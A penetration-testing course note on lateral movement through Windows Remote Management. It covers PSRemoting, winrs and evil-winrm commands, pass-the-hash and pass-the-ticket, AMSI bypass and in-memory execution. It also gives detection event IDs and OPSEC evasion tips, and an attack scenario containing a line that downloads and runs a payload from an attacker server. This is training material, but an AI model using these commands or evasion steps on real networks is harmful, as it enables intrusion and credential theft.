---
tags: [active-directory, intermediate, lateral-movement, vapt]
difficulty: intermediate
module: "68 - AD Lateral Movement and Credential Access"
topic: "68.02 Lateral Movement via WinRM"
---

# Lateral Movement via WinRM and PSRemoting

## Introduction to WinRM and PSRemoting
Windows Remote Management (WinRM) is the Microsoft implementation of the WS-Management Protocol, a standard simple object access protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems from different vendors to interoperate. 

PowerShell Remoting (PSRemoting) relies entirely on WinRM to execute PowerShell commands on remote systems. For penetration testers and threat actors, WinRM is an incredible administrative feature because it is native, extremely powerful, and often enabled by default in modern Windows Server environments (Windows Server 2012 and above). Since it utilizes HTTP/HTTPS (typically ports 5985 and 5986), it is often allowed through internal firewalls.

When abusing WinRM, attackers do not need to drop malicious binaries to disk immediately. They can simply open a remote interactive shell or pass script blocks to be executed entirely in memory, evading traditional file-based antivirus solutions.

---

## Architectural ASCII Diagram: WinRM / PSRemoting Execution

```text
+-----------------------+                                +-----------------------+
|                       |                                |                       |
|   Attacker Node /     |                                |    Target Windows     |
|   Compromised Client  |                                |    Server / Workstation|
|                       |                                |                       |
|  +-----------------+  |                                |  +-----------------+  |
|  |                 |  |       1. Authenticated     ======>|                 |  |
|  |  PowerShell.exe |  |       HTTP/SOAP Request        |  |  WinRM Service  |  |
|  |                 |  |       (Port 5985/5986)         |  |   (svchost.exe) |  |
|  +--------+--------+  |                                |  +--------+--------+  |
|           |           |                                |           |           |
|           |           |                                |           | 2. Spawns |
|           v           |                                |           v           |
|  +-----------------+  |                                |  +-----------------+  |
|  |                 |  |       3. Sends Encrypted       |  |                 |  |
|  |  WSMan Provider |<====================================>|   wsmprovhost   |  |
|  |                 |  |       Payload / Commands       |  |     .exe        |  |
|  +-----------------+  |                                |  +-----------------+  |
|                       |                                |           |           |
+-----------------------+                                |           | 4. Exec   |
                                                         |           v           |
                                                         |  +-----------------+  |
                                                         |  |                 |  |
                                                         |  |   PowerShell    |  |
                                                         |  |   Runspace      |  |
                                                         |  |                 |  |
                                                         |  +-----------------+  |
                                                         |                       |
                                                         +-----------------------+
```

---

## Prerequisites for WinRM Abuse
To successfully move laterally using WinRM, several conditions must be met:
1. **Network Connectivity**: Ports 5985 (HTTP) or 5986 (HTTPS) must be reachable.
2. **WinRM Service Status**: The WinRM service must be running on the target.
3. **Authentication**: The attacker must possess valid credentials. By default, only members of the `Administrators` group or the `Remote Management Users` group can connect via WinRM.
4. **TrustedHosts**: If connecting from an untrusted domain or a standalone machine (like a Kali box without a valid domain Kerberos setup), the target IP/hostname might need to be added to the attacker machine's `TrustedHosts` list.

---

## Native Windows Tooling for WinRM

### 1. PowerShell Remoting (Enter-PSSession & Invoke-Command)
Native PowerShell cmdlets provide robust ways to interact with WinRM.

**Interactive Shell:**
If operating from a compromised Windows machine with valid context:
```powershell
Enter-PSSession -ComputerName TargetServer -Credential CORP\Administrator
```
Once entered, the prompt will change to `[TargetServer]: PS C:\Users\Administrator\Documents>`, allowing the attacker to interactively run commands as if sitting at the console.

**One-Off Command Execution:**
To run a command rapidly across one or multiple servers, `Invoke-Command` is utilized. This is heavily used for staging payloads or quick reconnaissance.
```powershell
$cred = Get-Credential
Invoke-Command -ComputerName TargetServer -Credential $cred -ScriptBlock { Get-Process | Select-Object Name, Id }
```
`Invoke-Command` can also be used to bypass Execution Policies by passing script contents dynamically.

### 2. Windows Remote Shell (WinRS)
`winrs.exe` is a command-line tool built into Windows that uses WinRM to execute commands. It does not require PowerShell to be the target process.

```cmd
winrs -r:TargetServer -u:CORP\Administrator -p:Password123 cmd.exe /c whoami
```
This spawns a remote `cmd.exe` process rather than a PowerShell runspace, which can sometimes bypass restrictive PowerShell logging configurations.

---

## Advanced Attacker Tooling: Evil-WinRM

`Evil-WinRM` is an essential Ruby-based tool for penetration testers operating from Linux (Kali) environments. It acts as the ultimate WinRM hacking toolkit, supporting Pass-the-Hash, in-memory script execution, AMSI bypasses, and file transfer.

### Basic Usage and Pass-the-Hash
Evil-WinRM allows authentication using an NTLM hash directly, completely bypassing the need to crack the password.

```bash
# Connecting with plaintext credentials
evil-winrm -i 10.10.10.100 -u Administrator -p Password123

# Connecting via Pass-the-Hash (PtH)
evil-winrm -i 10.10.10.100 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

### Advanced Features of Evil-WinRM

**1. In-Memory PowerShell Script Loading**
Instead of uploading a script to the target (which is highly likely to trigger EDRs or Anti-Virus), Evil-WinRM can load scripts directly into memory.

```bash
evil-winrm -i 10.10.10.100 -u Administrator -p Password -s /opt/scripts/
```
Once connected, simply typing the script name (e.g., `Invoke-BloodHound.ps1`) will execute it entirely in memory.

**2. Bypassing AMSI (Antimalware Scan Interface)**
When connecting to modern Windows systems, PowerShell scripts are scanned by AMSI before execution. Evil-WinRM includes built-in commands to attempt AMSI bypasses.
```text
*Evil-WinRM* PS C:\> menu
*Evil-WinRM* PS C:\> Bypass-4MSI
```

**3. Executing .NET Assemblies (C# Binaries) in Memory**
You can execute standard C# tools (like Seatbelt, Rubeus, or SharpHound) directly from memory without dropping the `.exe` to disk.
```bash
evil-winrm -i 10.10.10.100 -u Administrator -p Password -e /opt/assemblies/
```
Inside the session:
```text
*Evil-WinRM* PS C:\> Invoke-Binary /opt/assemblies/Seatbelt.exe
```

---

## Pass-the-Ticket (PtT) over WinRM
If an attacker has dumped a Kerberos Ticket Granting Ticket (TGT) for an administrative user, they can use it to authenticate to WinRM without the hash or password.

On Linux (using `impacket` or `KRB5CCNAME`):
```bash
export KRB5CCNAME=/tmp/administrator.ccache
# Now use evil-winrm or impacket tools without specifying a password or hash, relying on Kerberos authentication.
```

On Windows (using Rubeus):
```cmd
Rubeus.exe ptt /ticket:base64ticket...
```
Once the ticket is injected into the current logon session, `Enter-PSSession -ComputerName TargetServer` will succeed seamlessly via Kerberos authentication.

---

## Evasion, OPSEC, and Detection
WinRM leaves distinct footprints:
1. **Event Logs**: 
    - `Microsoft-Windows-WinRM/Operational` logs connections.
    - Security Event ID 4624 (Logon Type 3 - Network Logon) is generated.
    - `Microsoft-Windows-PowerShell/Operational` (Event ID 4104) logs Script Block execution. If an attacker runs malicious PowerShell over WinRM, it will be logged here, assuming Script Block Logging is enabled.
2. **Process Execution**: WinRM spawns `wsmprovhost.exe`. Any child processes spawned from `wsmprovhost.exe` (like `cmd.exe`, `whoami.exe`, or encoded PowerShell commands) are highly suspicious.

### OPSEC Considerations
- Always prefer in-memory execution to avoid disk I/O.
- Be aware of Script Block Logging (Event ID 4104). Obfuscating commands or applying AMSI bypasses prior to executing main payloads is critical.
- Ensure that the generated traffic on ports 5985/5986 blends in with normal administrative traffic in the environment.

---


## Real-World Attack Scenario
In a recent penetration test against an energy sector organization, the attackers managed to spear-phish a junior systems administrator, gaining a Beacon on their Windows 10 workstation. The organization had mature EDR deployments and heavily monitored SMB traffic (port 445) and RDP connections, making traditional lateral movement tools like PsExec or standard RDP highly risky. However, they heavily relied on PowerShell Remoting (WinRM over port 5985) for daily administrative tasks.

The attacker scraped the workstation's LSASS memory and recovered the plaintext credentials of the `admin_jdoe` account. Using these credentials, the attacker decided to leverage `Evil-WinRM`, a stealthy tool designed for PowerShell Remoting, from their Linux attack box tunneled through a SOCKS proxy.

```bash
proxychains4 evil-winrm -i 10.100.5.20 -u admin_jdoe -p 'Winter2025!'
```

The connection succeeded, granting an interactive PowerShell session on a critical internal file server. Realizing that dropping executables to disk would trigger the EDR, the attacker opted for purely in-memory execution. They hosted a malicious PowerShell payload on their attack server and used the WinRM session to download and execute it directly into memory.

```powershell
*Evil-WinRM* PS C:\Users\admin_jdoe\Documents> IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.55/payload.ps1')
```

The payload mapped a C2 framework stager into the memory space of the running `wsmprovhost.exe` process (the host process for WinRM sessions). The EDR completely ignored the activity because `wsmprovhost.exe` executing PowerShell scripts and making network connections was the established baseline behavior for this server during administrative tasks. 

Once the new Beacon checked in, the attacker enumerated the file server's local groups and discovered that a Domain Admin account was actively logged in. The attacker then used their in-memory access to inject a specialized token-stealing module, impersonating the Domain Admin and opening a direct path to compromise the primary Domain Controller. By utilizing WinRM, the attacker blended perfectly into the background noise of the organization's legitimate administrative operations, completely evading detection until the final stages of the attack.

## Chaining Opportunities
- **[[01 - Lateral Movement via RDP and Hijacking Sessions]]**: WinRM can be used to silently query registry keys or modify them to enable RDP remotely if it is disabled.
- **[[05 - Dumping LSASS Memory Mimikatz Procdump Comsvcs]]**: Attackers frequently use WinRM via `Invoke-Command` to rapidly execute `procdump` or comsvcs.dll techniques to dump LSASS across multiple servers simultaneously.
- **Persistence**: WinRM can be leveraged to establish WMI event subscriptions or create scheduled tasks for stealthy persistence.

## Related Notes
- [[03 - Lateral Movement via SMB PsExec SmbExec]]
- [[04 - Lateral Movement via WMI WMIExec]]
- [[Kerberoasting and AS-REP Roasting]]
- [[Active Directory Enumeration with BloodHound]]

---
*End of Document*
